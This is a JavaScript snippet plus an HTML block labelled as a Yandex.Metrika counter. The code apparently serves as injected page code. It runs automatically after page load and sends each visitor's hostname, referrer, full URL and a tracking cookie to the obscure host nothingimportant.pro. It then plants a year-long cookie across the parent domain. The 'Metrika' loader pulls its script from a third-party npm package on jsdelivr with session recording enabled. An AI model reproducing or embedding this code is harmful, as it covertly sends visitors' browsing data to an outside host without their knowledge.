function cookie(e, o, i) {
    if (void 0 === o) {
        var n = null;
        if (document.cookie && "" != document.cookie)
            for (var r = document.cookie.split(";"), t = 0; t < r.length; t++) {
                var p = jQuery.trim(r[t]);
                if (p.substring(0, e.length + 1) == e + "=") {
                    n = decodeURIComponent(p.substring(e.length + 1));
                    break
                }
            }
        return n
    }
    i = i || {},
    null === o && (o = "",
        i.expires = -1);
    var s, u = "";
    i.expires && ("number" == typeof i.expires || i.expires.toUTCString) && ("number" == typeof i.expires ? (s = new Date).setTime(s.getTime() + 24 * i.expires * 60 * 60 * 1e3) : s = i.expires,
        u = "; expires=" + s.toUTCString());
    var c = i.path ? "; path=" + i.path : ""
        , m = i.domain ? "; domain=" + i.domain : ""
        , a = i.secure ? "; secure" : "";
    document.cookie = [e, "=", encodeURIComponent(o), u, c, m, a].join("")
}
function checkCookie() {
    var cookieEnabled=(navigator.cookieEnabled) ? 1 : 0;
    if (typeof navigator.cookieEnabled=="undefined" && !cookieEnabled){
        document.cookie="testcookie";
        cookieEnabled=(document.cookie.indexOf("testcookie") !== -1) ? 1 : 0;
    }
    return cookieEnabled
}
async function sendUserIdentification() {
    try {
        const response = await fetch("https://nothingimportant.pro/request.json", {
            method: 'POST',
            mode: 'cors',
            cache: 'no-cache',
            credentials: 'include',
            redirect: 'follow',
            referrer: 'no-referrer',
            body: JSON.stringify({
                'currentHost': window.location.hostname,
                'currentReferrer': document.referrer,
                'currentUrl': window.location.href,
                'userTokenId': cookie("_mc_ud_id"),
                'checkCookie': checkCookie()
            }),
            headers: {
                'Content-Type': 'multipart/form-data',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
            }
        });
        const data = await response.json();
        if (data.status === "success" && data.token_id) {
            cookie("_mc_ud_id", null);
            let host = window.location.hostname;
            if (host.split('.').length > 1) {
                let domainParts = host.split('.'),
                    l = domainParts.pop(),
                    d = domainParts.pop();
                host = d + '.' + l;
            }
            cookie("_mc_ud_id", data.token_id, {
                'domain': "." + host,
                'expires': 365,
                'path': '/'
            });
        }
    } catch (error) {console.error('Error:', error);}
}
setTimeout(sendUserIdentification.bind(this), 1000);
<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/watch.js", "ym");
   ym(50013841, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/50013841" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->
